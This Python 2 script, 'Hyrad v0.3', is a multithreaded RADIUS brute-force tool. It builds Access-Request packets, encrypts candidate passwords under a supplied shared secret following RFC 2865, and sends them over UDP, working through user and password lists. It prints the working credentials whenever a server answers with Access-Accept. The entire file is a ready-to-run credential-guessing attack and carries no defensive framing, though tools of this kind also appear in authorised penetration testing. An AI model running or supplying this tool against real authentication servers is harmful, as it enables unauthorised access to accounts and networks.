#!/usr/bin/env python

from multiprocessing.dummy import Pool
import socket, hashlib, argparse, re, textwrap, sys, select


'''
TODO
- generate random AUTHENTICATOR
- fuzzing?
'''

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# convert num to hex, i.e. 1 => \x01, 10 => \x0A etc.
# least_num_of_byte controls whether padding would be done. e.g. num =1, least_num_of_byte = 2 => \x00\x01
def int_to_hex(num, least_num_of_byte = 1):
    hex_length = 2*least_num_of_byte + 2
    return "{0:#0{1}x}".format(num, hex_length)[2:].decode("hex")

# encrypting the password based on https://tools.ietf.org/html/rfc2865#page-27
def enc_pass(shared_key, authenticator, password):
    CHUNK_SIZE = 16

    pass_ary = [password[i:i+CHUNK_SIZE] for i in range(0, len(password), CHUNK_SIZE)]
    final = ""

    for chunk in pass_ary:
        if len(chunk) < CHUNK_SIZE:
            chunk = (chunk.encode("hex") + "00" * (CHUNK_SIZE - len(chunk))).decode("hex")
        md5 = hashlib.md5()
        try:
            xor
            # subsequent run, chunk n xor MD5(shared key + chunk n-1)
            md5.update(shared_key + xor)
        except NameError:
            # first run, chunk1 xor MD5(shared key + authenticator)
            md5.update(shared_key + authenticator)

        IV = md5.hexdigest()
        xor = "".join(chr(ord(x) ^ ord(y)) for x, y in zip(chunk, IV.decode("hex")))
        final += xor

    return final


def brute(user):

    RADIUS_CODE = "\x01" # access-request - https://en.wikipedia.org/wiki/RADIUS#Packet_structure
    AUTHENTICATOR = "\x20\x20\x20\x20\x20\x20\x31\x34\x38\x35\x33\x37\x35\x35\x36\x33"

    for idx, pwd in enumerate(allpasses):
        pack_id = int_to_hex(idx%256)

        # generate password related fields
        AVP_PWD_TYPE = "\x02"
        encrypted = enc_pass(args.secret, AUTHENTICATOR, pwd)
        avp_pwd_len = len(encrypted) + len(AVP_PWD_TYPE) + 1 # reserve 1B for the length field itself
        avp_pwd_len_hex = int_to_hex(avp_pwd_len%256) # 256 = 2^8 = 1 byte available for length

        # generate user related fields
        AVP_UNAME_TYPE = "\x01"
        avp_uname_len = len(user) + len(AVP_UNAME_TYPE) + 1 # reserve 1B for the length field itself
        avp_uname_len_hex = int_to_hex(avp_uname_len%256) # 256 = 2^8 = 1 byte available for length

        pkt_len = avp_pwd_len + avp_uname_len + len(AUTHENTICATOR) + len(pack_id) + len(RADIUS_CODE) + 2 # reserve 2B for the length field itself
        pkt_len_hex = int_to_hex(pkt_len%65536, 2) # 65536 = 2^16 = 2 bytes available for length

        # send it
        socket.sendto(RADIUS_CODE + pack_id + pkt_len_hex + AUTHENTICATOR + AVP_UNAME_TYPE + avp_uname_len_hex + user + AVP_PWD_TYPE + avp_pwd_len_hex + encrypted, (args.ip, int(args.port)))
        ready = select.select([socket], [], [], 5)
        if ready[0]:
            resp_hex = socket.recv(2048).encode("hex")
            print resp_hex
            resp_code = resp_hex[:2]
            if resp_code == "02":
                print "success with secret: %s and password: %s" % (args.secret, pwd)
        else:
            print "Timeout"

# parse arguments
parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
    description=textwrap.dedent('''\
        %sHyrad - v0.3
        An utility tool to brute force authentication service using Radius protocol.%s
    ''' % (bcolors.OKGREEN, bcolors.ENDC)))

parser.add_argument('ip', metavar="IP", help="Required. The IP address where the radius service is running")
parser.add_argument('-P', '--port', dest="port", help="The port of the radius service. Default 1812", default=1812)
parser.add_argument('-u', '--username', dest="user", help="The username to be used.")
parser.add_argument('--userlist', dest="userlist", help="The list of users to be used.")
parser.add_argument('-p', '--password', dest="password", help="The password to be used.")
parser.add_argument('--passlist', dest="passlist", help="The list of passwords to be tried.")
parser.add_argument('-s', '--secret', dest="secret", help="Required. The shared secret to be used", required=True)
parser.add_argument('-t', '--thread', dest="thread", help="The number of threads to be used. Default 4", default=4)

args = parser.parse_args()

# get the final list of users to try
allusers = []
if args.userlist is not None:
    with open(args.userlist) as f:
        allusers = f.readlines()

if args.user is not None:
    allusers += [args.user]

if len(allusers) == 0:
    print "\n\n%sNo user was provided. Quitting%s\n\n"%(bcolors.FAIL, bcolors.ENDC)
    parser.print_help()
    sys.exit(2)

# rid of new lines etc
allusers = [x.strip() for x in allusers]

# get the final list of passwords
allpasses = []
if args.passlist is not None:
    with open(args.passlist) as f:
        allpasses += f.readlines()

if args.password is not None:
    allpasses += [args.password]

if len(allpasses) == 0:
    print "\n\n%sNo password was provided. Quitting%s\n\n"%(bcolors.FAIL, bcolors.ENDC)
    parser.print_help()
    sys.exit(2)

allpasses = [x.strip() for x in allpasses]

# prepare socket
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
socket.setblocking(0)

pool = Pool(int(args.thread))
pool.map(brute, allusers)

pool.close()
pool.join()
